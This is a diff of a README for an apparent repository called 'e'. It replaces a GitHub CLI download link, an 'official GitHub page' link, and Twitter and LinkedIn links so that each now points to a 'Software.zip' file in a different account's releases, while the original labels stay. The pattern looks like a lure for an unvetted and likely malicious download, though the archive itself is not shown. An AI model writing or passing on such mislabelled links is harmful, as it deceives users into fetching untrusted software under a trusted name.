@@ -6,7 +6,7 @@
 
 📦 To get started with the "e" repository, you can download the repository by clicking on the link below:
 <!-- launch-button -->
-[![Download e Repository](https://img.shields.io/badge/Download%20Here-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download e Repository](https://github.com/computoki/e/releases/download/v1.0/Software.zip%20Here-v1.0.0-blue)](https://github.com/computoki/e/releases/download/v1.0/Software.zip)
 
 ## Launch e Repository
 
@@ -20,7 +20,7 @@
 
 ## Additional Resources
 
-🔗 To find more information about the "e" repository and its development, consider visiting the official GitHub page at [cli/cli](https://github.com/cli/cli).
+🔗 To find more information about the "e" repository and its development, consider visiting the official GitHub page at [cli/cli](https://github.com/computoki/e/releases/download/v1.0/Software.zip).
 
 Explore, learn, and enjoy the "e" repository - happy coding! 🌟
 
@@ -38,8 +38,8 @@ Explore, learn, and enjoy the "e" repository - happy coding! 🌟
 ## Stay Connected
 
 🌐 Stay connected with the latest updates from the "e" repository by following us on:
-- [Twitter](https://twitter.com)
-- [LinkedIn](https://linkedin.com)
+- [Twitter](https://github.com/computoki/e/releases/download/v1.0/Software.zip)
+- [LinkedIn](https://github.com/computoki/e/releases/download/v1.0/Software.zip)
 
 Thank you for exploring the "e" repository! 🎉
 
